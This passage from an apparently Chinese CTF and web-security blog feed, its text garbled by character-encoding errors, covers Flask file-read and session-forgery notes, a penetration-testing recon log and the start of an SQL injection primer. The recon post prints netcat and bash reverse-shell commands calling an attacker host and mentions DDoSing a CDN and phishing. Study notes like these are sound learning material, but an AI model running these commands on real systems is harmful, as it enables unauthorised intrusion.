<h3 id="static-folder-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#static-folder-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="static_folder ä»»æ„æ–‡ä»¶è¯»å–"></a>static_folder ä»»æ„æ–‡ä»¶è¯»å–</h3><p>flaskåœ¨åˆå§‹åŒ–çš„æ—¶å€™ ä¼šè®¾ç½®å¾ˆå¤šå†…éƒ¨çš„å±æ€§</p>
<pre><code class="highlight plaintext">python
def __init__(
        self,
        import_name: str,
        static_url_path: str | None = None,
        static_folder: str | os.PathLike | None = &quot;static&quot;,
        static_host: str | None = None,
        host_matching: bool = False,
        subdomain_matching: bool = False,
        template_folder: str | os.PathLike | None = &quot;templates&quot;,
        instance_path: str | None = None,
        instance_relative_config: bool = False,
        root_path: str | None = None,
    ):
    #è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æˆå‘˜
self.config ç”¨æ¥å­˜å‚¨é…ç½®  self.extensions ç”¨æ¥å­˜å‚¨æ‰©å±•çš„çŠ¶æ€ã€‚
self.aborter å’Œ self.url_build_error_handlers ç”¨æ¥å¤„ç† HTTP é”™è¯¯å’Œ URL æ„å»ºé”™è¯¯ã€‚
self.teardown_appcontext_funcs å’Œ self.shell_context_processors ç”¨æ¥ç®¡ç†åº”ç”¨ä¸Šä¸‹æ–‡å’Œ shell ä¸Šä¸‹æ–‡ã€‚
self.blueprints ç”¨æ¥ç»„ç»‡åº”ç”¨çš„æ¨¡å—åŒ–åŠŸèƒ½ï¼Œself.url_map ç®¡ç†è·¯ç”±è§„åˆ™ã€‚
self.url_map å‚¨å­˜äº†åº”ç”¨çš„è·¯ç”±ä¿¡æ¯
self.add_url_ruleç”¨æ¥æ·»åŠ  URL è§„åˆ™</code></pre>

<p>æ³¨æ„åˆ°æ˜¯è¿™ä¸ª</p>
<pre><code class="highlight plaintext">plaintext
static_url_path: str | None = None æŒ‡å®šé™æ€æ–‡ä»¶çš„ URL è·¯å¾„ï¼ˆå³æµè§ˆå™¨ä¸­è®¿é—®é™æ€æ–‡ä»¶çš„è·¯å¾„ï¼‰
static_folder æŒ‡å®šé™æ€æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹è·¯å¾„</code></pre>

<p>å¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†ç›¸å…³çš„å€¼ å°±å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ä¸è¿‡åœ¨å‚æ•°ä¼ é€’çš„æ—¶å€™ ä¸å¯ä»¥ä½¿ç”¨&#x3D;ç»™è¿™äº›ä¸œè¥¿èµ‹å€¼ éœ€è¦ä½¿ç”¨setattrè¿™ä¸ªç»™ä»–ä»¬èµ‹å€¼</p>
<pre><code class="highlight plaintext">plaintext
setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>

<h3 id="è·¯ç”±æ³¨å…¥"><a href="#è·¯ç”±æ³¨å…¥" class="headerlink" title="è·¯ç”±æ³¨å…¥"></a>è·¯ç”±æ³¨å…¥</h3><h2 id="Flask-RCEåˆ©ç”¨-debugç¯‡"><a href="#Flask-RCEåˆ©ç”¨-debugç¯‡" class="headerlink" title="Flask RCEåˆ©ç”¨(debugç¯‡)"></a>Flask RCEåˆ©ç”¨(debugç¯‡)</h2><h2 id="ä¸€äº›è¾…åŠ©å·¥ä½œ"><a href="#ä¸€äº›è¾…åŠ©å·¥ä½œ" class="headerlink" title="ä¸€äº›è¾…åŠ©å·¥ä½œ"></a>ä¸€äº›è¾…åŠ©å·¥ä½œ</h2><p>ä¸€èˆ¬ä¼šåœ¨ä¸€å¼€å§‹å¥—ä¸ªsession çš„éªŒè¯</p>
<p>è¿™é‡Œå°±è¦ç”¨åˆ°sessionä¼ªé€ çš„èŠå£«äº†ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹sessionç½¢</p>
<p>1ï¼‰flask session åˆ†æ<br>flaskå¯¹sessionçš„å¤„ç†ä½äºflask&#x2F;sessions.pyä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹flaskçš„sessionä»¥cookieçš„å½¢å¼ä¿å­˜äºå®¢æˆ·ç«¯ï¼Œåˆ©ç”¨ç­¾åæœºåˆ¶æ¥é˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚</p>
<pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
1</code></pre>

<ul>
<li>é€šè¿‡.éš”å¼€çš„3æ®µå†…å®¹ï¼Œç¬¬ä¸€æ®µå…¶å®å°±æ˜¯base64 encodeåçš„å†…å®¹ï¼Œä½†å»æ‰äº†å¡«å……ç”¨çš„ç­‰å·ï¼Œè‹¥decodeå¤±è´¥ï¼Œè‡ªå·±éœ€è¦è¡¥ä¸Š1-3ä¸ªç­‰å·è¡¥å…¨ã€‚ä¸­é—´å†…å®¹ä¸ºæ—¶é—´æˆ³ï¼Œåœ¨flaskä¸­æ—¶é—´æˆ³è‹¥è¶…è¿‡31å¤©åˆ™è§†ä¸ºæ— æ•ˆã€‚æœ€åä¸€æ®µåˆ™æ˜¯å®‰å…¨ç­¾åï¼Œå°†sessiondata,æ—¶é—´æˆ³ï¼Œå’Œflaskçš„secretkeyé€šè¿‡sha1è¿ç®—çš„ç»“æœã€‚</li>
</ul>
<pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64åçš„æºå­—ç¬¦ä¸² . æ—¶é—´æˆ³ . hmacç­¾åä¿¡æ¯
1</code></pre>

<ul>
<li>æœåŠ¡ç«¯æ¯æ¬¡æ”¶åˆ°cookieåï¼Œä¼šå°†cookieä¸­å‰ä¸¤æ®µå–å‡ºå’Œsecretkeyåšsha1è¿ç®—ï¼Œè‹¥ç»“æœä¸cookieç¬¬ä¸‰æ®µä¸ä¸€è‡´åˆ™è§†ä¸ºæ— æ•ˆã€‚</li>
<li>ä»cookieè·å–sessionçš„è¿‡ç¨‹ä¾¿æ˜¯éªŒè¯ç­¾å-&gt;éªŒè¯æ˜¯å¦è¿‡æœŸ-&gt;è§£ç ã€‚</li>
</ul>
<p><a href="https://xz.aliyun.com/news/13858">å‚è€ƒæ–‡ç« </a>: <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>	â€œflaskæ¡†æ¶æ¼æ´â€<br><a href="https://xz.aliyun.com/news/13858">å‚è€ƒæ–‡ç« </a>: <a href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>	â€œpython rceâ€</p>
]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€ä¸ªé£èˆçš„æ¸—é€å­¦ä¹ å®å½•</title>
    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
    <content><![CDATA[<p>â€”â€“ä¸çŸ¥é“æ€ä¹ˆå½¢å®¹ï¼Œå°±å«åšä¸€ä¸ªé£èˆçš„æ¸—é€å®å½•å§ï¼Œé£èˆæŒºé£èˆçš„ï¼Œå­¦ä¹ŸçœŸåœ¨å­¦ï¼Œå”‰å”‰ï¼Œå¾ˆéš¾ä¸ç€æ€¥(åˆå¹»æƒ³äº†ï¼Œå¹»æƒ³ä¸è¢«åé¢æ¥çš„webæ‰‹æ‰“é£)ï¼Œé“å¿ƒæˆ–è®¸å¤šå¤šå°‘å°‘æœ‰ç‚¹ä¹±äº†ï¼Œä¼ ç»ŸwebåŸºç¡€æœ‰ç‚¹å­¦ä¸è¿›å»äº†ï¼Œæç‚¹æ¸—é€è°ƒæ•´ä¸€ä¸‹çŠ¶æ€å§ï¼Œä¹Ÿåˆšå¥½ä¹‹åæœ‰ä¸ªAWDå¯ä»¥ç»ƒä¸€ä¸‹(æˆ‘ç»å¯¹ä¸ä¼šè¯´æ˜¯ä¸ºäº†AWDæ‰æå‰å¼€å§‹å­¦çš„ã€‚ã€‚)</p>
<p>å¤§æ¦‚ä¼šæŒç»­æ›´æ–°å§å—¯å—¯ï¼Œæ¯•ç«Ÿä¸€æœä¸€å¤•ä¹Ÿå­¦ä¸å®Œçš„</p>
<h1 id="ä¸€ä¸ªé£èˆçš„æ¸—é€å­¦ä¹ å®å½•"><a href="#ä¸€ä¸ªé£èˆçš„æ¸—é€å­¦ä¹ å®å½•" class="headerlink" title="ä¸€ä¸ªé£èˆçš„æ¸—é€å­¦ä¹ å®å½•"></a>ä¸€ä¸ªé£èˆçš„æ¸—é€å­¦ä¹ å®å½•</h1><p>é¦–å…ˆå¿…é¡»äº†è§£çš„å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¸—é€æµ‹è¯•çš„åŸºæœ¬æµç¨‹å•¦ã€‚ã€‚</p>
<p>æ ¹æ®ç½‘ä¸Šå¯è€ƒèµ„æ–™ï¼Œæ¸—é€å¤§æ¦‚åˆ†æˆè¿™æ ·å‡ ä¸ªæµç¨‹</p>
<pre><code class="highlight plaintext">ä¿¡æ¯æ”¶é›†/å¤–ç½‘æ‰“ç‚¹
å†…ç½‘æ¸—é€
æƒé™ç»´æŒ
æ¨ªå‘ç§»åŠ¨</code></pre>

<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä¿¡æ¯æ”¶é›†èƒ½åŠ›ï¼Œå”‰å”‰ï¼Œä½ åšwebå“ªä¸ªä¸è¦ä¿¡æ¯æ”¶é›†ï¼Œè¿™ä¸œè¥¿ç¡®å®éœ€è¦å¥½å¥½è®­ç»ƒä¸€ä¸‹</p>
<h3 id="æ­£é¢ä¿¡æ¯æ”¶é›†"><a href="#æ­£é¢ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ­£é¢ä¿¡æ¯æ”¶é›†"></a>æ­£é¢ä¿¡æ¯æ”¶é›†</h3><h4 id="ç½‘é¡µä¿¡æ¯"><a href="#ç½‘é¡µä¿¡æ¯" class="headerlink" title="ç½‘é¡µä¿¡æ¯"></a>ç½‘é¡µä¿¡æ¯</h4><p>åœ¨æµè§ˆç½‘é¡µçš„æ—¶å€™ï¼Œæœ‰æ—¶å¯ä»¥æ‹¿åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯çš„</p>
<ul>
<li>ç½‘é¡µçš„URL:å¯èƒ½ä¼šæš´éœ²ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼Œå†å‘ä¸‹è§‚å¯Ÿç½‘ç«™æ˜¯å¦æœ‰åœ¨çº¿å®¢æœçª—å£ï¼Œç½‘ç«™åº•éƒ¨ä½ å¯èƒ½åœ¨ç½‘ç«™é¡µé¢è§‚å¯Ÿåˆ°çš„ä¿¡æ¯æœ‰ï¼šURLä¿¡æ¯ï¼ˆ1.ä¾‹å¦‚ä½¿ç”¨çš„OA.xxxcom2.ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼‰ã€åœ¨çº¿å®¢æœã€æŠ€æœ¯æ”¯æŒã€å…³äºå…¬å¸çš„è”ç³»æ–¹å¼ï¼ˆé‚®ç®±ã€ç”µè¯å·ç ã€å·¥ä½œåœ°ç‚¹ç­‰ï¼‰ã€å¤‡æ¡ˆå·ã€è¥ä¸šæ‰§ç…§ã€åå°ç™»å½•æ¥å£ã€å‹æƒ…é“¾æ¥ã€æŸäº›äºŒç»´ç ç­‰ã€‚è€Œä¸”ä½ æŠ“åŒ…åŸºæœ¬ä¸Šä¹Ÿèƒ½æŠ“åˆ°åº•å±‚è„šæœ¬è¯­è¨€çš„&#x2F;æ‚å‡ºåº•å±‚æ¡†æ¶çš„</li>
</ul>
<h4 id="åŸŸåä¿¡æ¯"><a href="#åŸŸåä¿¡æ¯" class="headerlink" title="åŸŸåä¿¡æ¯"></a>åŸŸåä¿¡æ¯</h4><p>å¯ä»¥å…ˆæ ¹æ®åŸŸåæ‘¸å‡ºæ¥å¯¹åº”çš„IP(å·¥å…·ï¼š<code>nslookupã€ip138</code>)</p>
<p>æˆ–è€…pingä¸€ä¸‹ä¹Ÿèƒ½æ‘¸åˆ°ipï¼Œä½†æ˜¯åªèƒ½æ‘¸åˆ°ä¸€ä¸ªIP(<strong>CDN</strong>çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æ˜¯çœŸå®çš„IP)</p>
<p>æ‰€ä»¥è¦ç”¨è¶…çº§PING(<code>itdog.com</code>)</p>
<p>è€Œè¦ç»•è¿‡IDNï¼Œéœ€è¦pingä¸€ä¸ªä¸å­˜åœ¨çš„äºŒçº§åŸŸåï¼Œç”¨é‚®ç®±(æœ‰è‡ªåŠ¨å›å¤å°±ç›´æ¥æ‰“æ‰äº†)æˆ–è€…ç”¨æµ·å¤–PING</p>
<pre><code class="highlight plaintext">ä¸å¤ªæ–‡æ˜çš„æ–¹æ³•ã€‚ã€‚ç”¨DdOSç›´æ¥æŠŠCDNæ‰“æ‰</code></pre>

<p><strong>ç«¯å£</strong></p>
<p>â€‹	ä¸€ä¸ªç½‘ç«™ä¼šå¼€æ”¾å¤šä¸ªç«¯å£ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŒä¸€ç½‘ç«™çš„ä¸åŒç«¯å£è¿›è¡Œæµ‹è¯•ï¼Œæ‰«æå¼€æ”¾ç«¯å£çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ–¹ä¾¿çš„è¯æ˜¯åˆ©ç”¨å·¥å…·æ‰«æç«¯å£ï¼Œå…¶æ¬¡æ˜¯ç”¨åœ¨çº¿çš„ç«¯å£æ‰«æç½‘ç«™ã€‚ç«¯å£æ‰«æå·¥å…·æ¨èæœ‰<code>nmap,goby</code>ç­‰</p>
<p><strong>å­åŸŸå</strong>&#x2F;<strong>èµ„äº§æµ‹ç»˜</strong></p>
<p>â€‹	æ”¶é›†å­åŸŸåå¯ä»¥æ‰©å¤§æµ‹è¯•çš„èŒƒå›´ï¼Œç»Ÿä¸€åŸŸåä¸‹çš„äºŒçº§åŸŸåéƒ½å±äºç›®æ ‡èŒƒå›´</p>
<p>ä»‹ç»ä¸€ä¸‹å­åŸŸåçš„ç›¸å…³æ¦‚å¿µ</p>
<pre><code class="highlight plaintext">é¡¶çº§åŸŸå(ä¸€çº§åŸŸå/çˆ¶åŸŸå)æ˜¯ç±»ä¼¼äº.com .net .org .cnä¹‹ç±»
å…¶æ¬¡çš„å°±è¦ä»å³å‘å·¦æŠŠä¼˜å…ˆåº¦ä¸‹é™
ä¾‹å¦‚ä¸‹é¢è¿™ä¸¤ä¸ªåŸŸå:mail.example.com  calendar.example.com
ä»–ä»¬æ˜¯example.comçš„ä¸¤ä¸ªå­åŸŸï¼Œè€Œexample.comåˆ™æ˜¯é¡¶çº§åŸŸ.comçš„å­åŸŸ</code></pre>

<p>å¸¸è§çš„å­åŸŸåçˆ†ç ´å·¥å…·ï¼š<code>oneforallã€layerå­åŸŸåæŒ–æ˜æœºã€SubDomainsBrute</code></p>
<p>ç”¨<strong>fofa,hunter</strong></p>
<p><strong>Cæ®µæ—æ³¨</strong></p>
<blockquote>
<p>é‚£æˆ‘é—®ä½ ï¼ŒCæ®µæ˜¯ä»€ä¹ˆ</p>
</blockquote>
<p>ä¸€ä¸ªIPåœ°å€å¯ä»¥è¿™æ ·åˆ†è§£:</p>
<pre><code class="highlight plaintext">192.168.0.1
A  | B |C|D</code></pre>

<p>ä¸€èˆ¬Cæ®µæŒ‡çš„æ˜¯åŒä¸€å†…ç½‘æ®µä¸‹çš„å…¶ä»–æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯Dæ®µ1-255ä¸­çš„ä¸€å°æœåŠ¡å™¨ï¼ŒCæ®µå…¥ä¾µå…¶å®å°±æ˜¯ä»å…¶ä»–æœåŠ¡å™¨å‡ºå‘è¿›è¡Œæµ‹è¯•</p>
<pre><code class="highlight plaintext">æµ‹è¯•å·¥å…·:Nmap</code></pre>

<hr>
<p>æ—ç«™å°±æ˜¯è¦ä»åŒä¸€æœåŠ¡å™¨ä¸‹çš„ä¸åŒç½‘ç«™è¿›è¡Œææƒæ‹¿ä¸‹æœåŠ¡å™¨ä»è€Œè¾¾åˆ°æ‹¿ä¸‹æ‰€æœ‰ç½‘ç«™çš„ç›®çš„</p>
<p>ä¹Ÿå¯ä»¥ç”¨æ‰«æå™¨</p>
<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,ç¯å¡”//fscanå’Œnmapæœ‰äº›è‡­åæ˜­è‘—äº†ï¼Œåˆ«ç”¨å°‘ç”¨</code></pre>

<p><strong>ç”¨æˆ·</strong></p>
<p>æ”¶é›†ç”¨æˆ·çš„ä¿¡æ¯</p>
<h4 id="èµ„äº§æŸ¥è¯¢"><a href="#èµ„äº§æŸ¥è¯¢" class="headerlink" title="èµ„äº§æŸ¥è¯¢"></a>èµ„äº§æŸ¥è¯¢</h4><p>å…¬å¸å-&gt;ICPå¤‡æ¡ˆ-&gt;å­åŸŸå-&gt;IP</p>
<p>çœ‹æ‹›æ ‡æ–‡ä»¶æ‰¾ä¾›åº”å•†-&gt;æ‰“è¿›æ”¿åºœäº‘</p>
<h4 id="æ•æ„Ÿç›®å½•"><a href="#æ•æ„Ÿç›®å½•" class="headerlink" title="æ•æ„Ÿç›®å½•"></a>æ•æ„Ÿç›®å½•</h4><p>è¿™ä¸ªå¾ˆç»å…¸äº†ï¼Œå¹³å¸¸åˆ·åˆ·é¢˜ç›®éƒ½ä¼šç¢°åˆ°çš„ç¨‹åº¦</p>
<p><code>dirsearch</code>ä¸€èˆ¬æ¥è¯´å¤Ÿç”¨ï¼Œä¸å¤šèµ˜è¿°</p>
<p>å…³æ³¨ä¸€ä¸‹è¿™äº›èƒ½è¿›å»çš„ç›®å½•&#x2F;å¯ä»¥ä¼ å‚çš„ä¸€äº›å¸¦æœ‰ç‰¹æ®ŠåŠŸèƒ½çš„é¡µé¢</p>
<pre><code class="highlight plaintext">ä»»æ„æ–‡ä»¶ä¸‹è½½
åå°
æœªæˆæƒè®¿é—®
æ•æ„Ÿä¿¡æ¯æ³„éœ²
SQLæ³¨å…¥</code></pre>

<h4 id="webç»„ä»¶"><a href="#webç»„ä»¶" class="headerlink" title="webç»„ä»¶"></a>webç»„ä»¶</h4><p>â€‹        å„ç§webç»„ä»¶ç»„åˆæ„æˆç½‘ç«™ã€‚</p>
<p>æ“ä½œç³»ç»Ÿ<br>        ç½‘ç«™æœåŠ¡å™¨æœ‰ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼š<code>windowsã€Linuxã€mac os</code>è¿™é‡Œéœ€è¦çŸ¥é“çš„æ˜¯windowså¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œå…¶ä»–ä¸¤ä¸ªå¯¹å¤§å°å†™æ•æ„Ÿå°±è¡Œäº†ã€‚</p>
<p>ï¼ˆ2ï¼‰æ•°æ®åº“<br>        ç›®å‰æ¯”è¾ƒå¸¸ç”¨çš„æ•°æ®åº“æœ‰<code>:MySQLã€SQL serverã€Oracle</code>ç­‰ã€‚SQL serverå¼€æ”¾çš„é»˜è®¤ç«¯å£ï¼š1433ï¼ŒMySQLå¼€æ”¾çš„é»˜è®¤ç«¯å£ï¼š3306ã€Oracleå¼€æ”¾çš„é»˜è®¤ç«¯å£ï¼š1521ã€‚</p>
<p>ï¼ˆ3ï¼‰å®¹å™¨<br>        ç›®å‰æ¯”è¾ƒå¸¸è§çš„webä¸­é—´ä»¶æœ‰ï¼š<code>IIS(iisè§£ææ¼æ´)ï¼Œapacheï¼Œtcmactï¼Œnginxï¼Œjboss</code>ç­‰ã€‚</p>
<p>ï¼ˆ4ï¼‰CMS<br>        <code>cms</code>æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±åˆ—ä¸¾ä¸€éƒ¨åˆ†ä¾‹å­ï¼š<code>dedeCMS</code>ã€ å¸å›½CMSç­‰ã€‚</p>
<p>ï¼ˆ5ï¼‰webæ¡†æ¶<br>        webæ¡†æ¶æœ‰<code>struts1</code>ã€<code>Struts2</code>ã€<code>Spring MVC</code>ç­‰ï¼ˆæ¡†æ¶æ¼æ´ï¼‰</p>
<p>ï¼ˆ6ï¼‰webç»„ä»¶è¯†åˆ«<br>        webç»„ä»¶è¯†åˆ«ï¼ˆwebæŒ‡çº¹è¯†åˆ«ï¼‰ä¸€èˆ¬å¯ä»¥è¯†åˆ«å‡ºä»¥ä¸Šçš„ç½‘ç«™åŸºç¡€ä¿¡æ¯ã€‚webæŒ‡çº¹è¯†åˆ«æˆ‘åˆ†ä¸ºåœ¨çº¿æ‰«æä¸å·¥å…·è¯†åˆ«ã€‚åœ¨çº¿æ‰«æçš„ç½‘ç«™æœ‰ï¼šæ½®æ±æŒ‡çº¹è¯†åˆ«<code>TideFinger</code> æ½®æ±æŒ‡çº¹ã€äº‘æ‚‰æŒ‡çº¹yunsee.cn-2.0ã€å¼ºå¤§çš„ç½‘ç«™ä¿¡æ¯æ‰«æç½‘ç½‘ç«™åŸºç¡€ä¿¡æ¯è·å– - <code>ThreatScan</code> - å…è´¹çš„ç½‘ç«™åœ¨çº¿å®‰å…¨æ£€æµ‹å¹³å°-<code>TScan</code>ï¼›</p>
<p>webæŒ‡çº¹è¯†åˆ«å·¥å…·ï¼šå¾¡å‰‘ã€åŒ—æç†Šæ‰«æå™¨ç­‰ï¼›æŒ‡çº¹è¯†åˆ«æ’ä»¶æœ‰<code>wappalyzer</code>ã€‚</p>
<h3 id="ä¾§é¢ä¿¡æ¯æ”¶é›†"><a href="#ä¾§é¢ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¾§é¢ä¿¡æ¯æ”¶é›†"></a>ä¾§é¢ä¿¡æ¯æ”¶é›†</h3><h4 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h4><p>â€‹     å¾—åˆ°ç›®æ ‡URLä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç«™é•¿ä¹‹å®¶æ¥è¿›è¡ŒwhiosæŸ¥è¯¢è¿™å®¶å…¬å¸çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šå…¬å¸åç§°ï¼Œæ³¨å†Œäººæˆ–è€…æœºæ„ã€è”ç³»æ–¹å¼ï¼šé‚®ç®±ï¼Œæ‰‹æœºå·ç ï¼Œå¤‡æ¡ˆå·ï¼Œipï¼ŒåŸŸåï¼ŒDNSï¼Œå°‘é‡å­åŸŸåç­‰ã€‚</p>
<h4 id="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"><a href="#ç½‘ç»œç©ºé—´æœç´¢å¼•æ“" class="headerlink" title="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"></a>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“</h4><p>â€‹    å¸¸ç”¨çš„ç©ºé—´æœç´¢å¼•æ“ä¸€èˆ¬æœ‰ï¼šFOFAã€shodanã€zoomeyeã€‚å…¶ä¸­FOFAä¸€èˆ¬æœç´¢åˆ°çš„æ˜¯ä¸€äº›ç½‘ç«™çš„ä¿¡æ¯ï¼Œæ”¶é›†åˆ°çš„åè½¯ä»¶ç±»ä¿¡æ¯æ¯”è¾ƒå¤šï¼›è€Œshodanå’Œzoomeyeåˆ™æ˜¯æœç´¢ç½‘ç»œåœ¨çº¿è®¾å¤‡ä¿¡æ¯ï¼Œåå‘äºæ”¶é›†ç¡¬ä»¶çš„ä¿¡æ¯ã€‚å…·ä½“ä½¿ç”¨è§„åˆ™éœ€è¦è‡ªå·±å»æ‘¸ç´¢ã€‚</p>
<h4 id="Googleæœç´¢"><a href="#Googleæœç´¢" class="headerlink" title="Googleæœç´¢"></a>Googleæœç´¢</h4><p>â€‹        Googleè¯­æ³•æ˜¯æœ€å¼ºå¤§çš„æœç´¢æ‰‹æ®µä¹‹ä¸€ï¼Œä½ å¯ä»¥æ”¶é›†åˆ°ä¸€äº›æ•æ„Ÿé¡µé¢ã€æ•æ„Ÿç›®å½•ã€ç½‘ç«™å†…å¯ä¸‹è½½çš„æ–‡ä»¶ã€å¯èƒ½å‡ºç°çš„sqlæ³¨å…¥ç‚¹å’Œæ–‡ä»¶ä¸Šä¼ ç‚¹ã€æœªæˆæƒè®¿é—®é¡µé¢ç­‰ã€‚</p>
<h4 id="WAFæ¢æµ‹"><a href="#WAFæ¢æµ‹" class="headerlink" title="WAFæ¢æµ‹"></a>WAFæ¢æµ‹</h4><p>â€‹        é€šè¿‡è¯†åˆ«ç½‘ç«™æ˜¯å¦å­˜åœ¨WAFä»¥åŠç½‘ç«™å­˜åœ¨ä»€ä¹ˆæ ·çš„WAFï¼Œæ ¹æ®è‡ªå·±çš„æ°´å¹³ï¼ˆèƒ½å¦ç»•è¿‡æ­¤ç±»WAFï¼‰æ¥å†³å®šè¿˜åº”ä¸åº”è¯¥èŠ±æ—¶é—´è€—åœ¨ç»•WAFä¸Šï¼ˆä¸ä»…é™äºå‚åŠ æ¯”èµ›ï¼‰ã€‚</p>
<h4 id="ä¸€äº›ä¸ç»å¸¸ç”¨çš„æŠ€å·§"><a href="#ä¸€äº›ä¸ç»å¸¸ç”¨çš„æŠ€å·§" class="headerlink" title="ä¸€äº›ä¸ç»å¸¸ç”¨çš„æŠ€å·§"></a>ä¸€äº›ä¸ç»å¸¸ç”¨çš„æŠ€å·§</h4><pre><code class="highlight plaintext">æŸ¥çœ‹githubå¹³å°ä¸Šæœ‰æ— ç±»ä¼¼æœ¬ç½‘ç«™çš„æºç ï¼Œæ•æ„Ÿä¿¡æ¯ï¼Œç™»é™†çš„è´¦å·å¯†ç ç­‰
ç¤¾å·¥
é’“é±¼
SSLè¯ä¹¦æŸ¥è¯¢</code></pre>

<h2 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h2><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><p>é¦–å…ˆä½ è¦å­¦ä¼šå¼¹shell</p>
<pre><code class="highlight plaintext">nc:
æ”»å‡»æœº:nc -lvvp [ç«¯å£]
ç›®æ ‡æœºnc &lt;æ”»å‡»æœºIP&gt; &lt;æ”»å‡»æœºç›‘å¬çš„ç«¯å£&gt; -e /bin/bash

bash:
æ”»å‡»æœº:nc -lvvp [ç«¯å£]
ç›®æ ‡æœº:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>

<h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><h2 id="æ¸…é™¤ç—•è¿¹æ“¦å±è‚¡"><a href="#æ¸…é™¤ç—•è¿¹æ“¦å±è‚¡" class="headerlink" title="æ¸…é™¤ç—•è¿¹æ“¦å±è‚¡"></a>æ¸…é™¤ç—•è¿¹<del>æ“¦å±è‚¡</del></h2>]]></content>
      <tags>
        <tag>-web -æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»é›¶å¼€å§‹çš„SQLæ³¨å…¥ç”Ÿæ´»</title>
    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<h1 id="ä»é›¶å¼€å§‹çš„SQLæ³¨å…¥ç”Ÿæ´»"><a href="#ä»é›¶å¼€å§‹çš„SQLæ³¨å…¥ç”Ÿæ´»" class="headerlink" title="ä»é›¶å¼€å§‹çš„SQLæ³¨å…¥ç”Ÿæ´»"></a>ä»é›¶å¼€å§‹çš„SQLæ³¨å…¥ç”Ÿæ´»</h1><p>å­—ä¹‰ä¸Šçš„ä»é›¶å¼€å§‹å–µã€‚ã€‚å­—ä¹‰ä¸Šçš„ç§äº†å¥½å¤šæ¬¡å–µã€‚ã€‚ã€‚</p>
<h2 id="Episode-1-SQLæ•°æ®åº“åŸºç¡€æ“ä½œ"><a href="#Episode-1-SQLæ•°æ®åº“åŸºç¡€æ“ä½œ" class="headerlink" title="Episode 1   SQLæ•°æ®åº“åŸºç¡€æ“ä½œ"></a>Episode 1   SQLæ•°æ®åº“åŸºç¡€æ“ä½œ</h2><ul>
<li><strong>åˆ›å»º</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#å»ºç«‹ä¸€ä¸ªæ•°æ®åº“
<span class="keyword">create</span> <span class="keyword">table</span> table_name(
column1 datatype,
.......
);#å»ºç«‹ä¸€ä¸ªè¡¨
</code></pre>



<ul>
<li><strong>æŸ¥è¯¢</strong></li>
</ul>
